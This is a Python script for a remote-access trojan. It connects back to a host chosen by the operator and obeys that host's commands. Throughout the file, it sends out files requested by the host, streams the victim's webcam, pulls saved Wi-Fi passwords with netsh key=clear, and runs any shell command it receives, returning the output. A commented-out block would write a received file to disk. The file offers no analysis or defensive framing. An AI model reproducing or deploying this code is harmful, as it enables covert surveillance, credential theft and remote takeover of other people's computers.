import os
import socket
import subprocess
import cv2



ip = raw_input("enter host: ")
s = socket.socket()
host = ip
port = 80
s.connect((host,port))

while True:
	data = s.recv(1048576)
	# print "-------"+data+"-------"

	if data[:3].decode("utf-8") == 'get':
		file = data[4:].decode("utf-8")
		f = open(file,'r')
		x = f.read(1048576)
		s.send(x)
	elif data[:3].decode("utf-8") == 'img':
		file = data[4:].decode("utf-8")
		f = open(file,'rb')

		l = f.read(1048576)
		s.send(l)

		# while True:
		# 	l = f.read(1048576)
		# 	while (l):
		# 		s.send(l)
		# 		# print('Sent ',repr(l))
		# 		l = f.read(1048576)
		# 	if l == '':
		# 		f.close()
		# 		break
	elif data[:3].decode("utf-8") == 'vid':
		cam = cv2.VideoCapture(0)
		while True:
		    ret, frame = cam.read()
		    

		    
		    
		    cv2.imshow("test", frame)
		    s.send(frame)
		    # if not ret:
		    #     break
		    k = cv2.waitKey(1)

		    # if k%256 == 27:
		    #     # ESC pressed
		    #     print("Escape hit, closing...")
		    #     break
		    # elif k%256 == 32:
		    #     # SPACE pressed
		    #     img_name = img_name               
		    #     cv2.imwrite(img_name, frame)
		    #     print("{} written!".format(img_name))
		        
		cam.release()

	elif data[:4].decode("utf-8") == 'wifi':
		data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
		profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
		for i in profiles:
		    try:
		        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
		        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
		        try:
		            s.send ("[{:<30}--->  {:<}]\n".format(i, results[0]))
		        except IndexError:
		            s.send ("[{:<30}--->  {:<}]\n".format(i, ""))
		    except subprocess.CalledProcessError:
		        s.send ("[{:<30}--->  {:<}]\n".format(i, "ENCODING ERROR"))

	# if data[:5].decode("utf-8") == 'plant':
	# 	fname = 'recieve'
	# 	f = open(fname,'wb')
	# 	x = data[6:]
	# 	f.write(x)
	# 	f.close()

	
	elif len(data) > 0:
		if data[:2].decode("utf-8") == 'cd':
			os.chdir(data[3:].decode("utf-8"))
		
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes)
		s.send(str.encode(output_str+str(os.getcwd())+ '>'))
		





s.close()